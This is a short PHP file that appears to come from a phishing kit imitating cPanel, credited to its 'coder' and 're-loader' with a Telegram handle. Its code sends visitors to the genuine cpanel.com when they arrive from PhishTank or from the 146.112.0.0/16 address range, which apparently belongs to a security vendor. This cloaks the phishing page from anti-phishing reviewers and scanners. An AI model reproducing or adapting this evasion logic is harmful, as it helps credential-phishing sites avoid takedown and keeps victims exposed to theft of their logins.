<?php

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Re-Loaded By Groot
 * icq+teleg = @iam_groot
 
###############################################
#$            C0d3d by Spoxcoder             $#
###############################################

**/
### Perform a HTTP REFERER check on the visitor to see if they are coming from the Phishtank website ###

		if(isset($_SERVER['HTTP_REFERER'])) {
		 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
		    header("Location: https://www.cpanel.com");
		    die();
		}
		}

		if(isset($_SERVER['HTTP_REFERER'])) {
		 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
		    header("Location: https://www.cpanel.com");
		    die();
		}
		}

 ### Check if the ip between 146.112.0.0 And 146.112.255.255 ###
	$range_start = ip2long("146.112.0.0");
	$range_end   = ip2long("146.112.255.255");
	$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);

	 if ($ip2long >= $range_start && $ip2long <= $range_end){
	   header("Location: https://www.cpanel.com");
	   die();
	 }

?>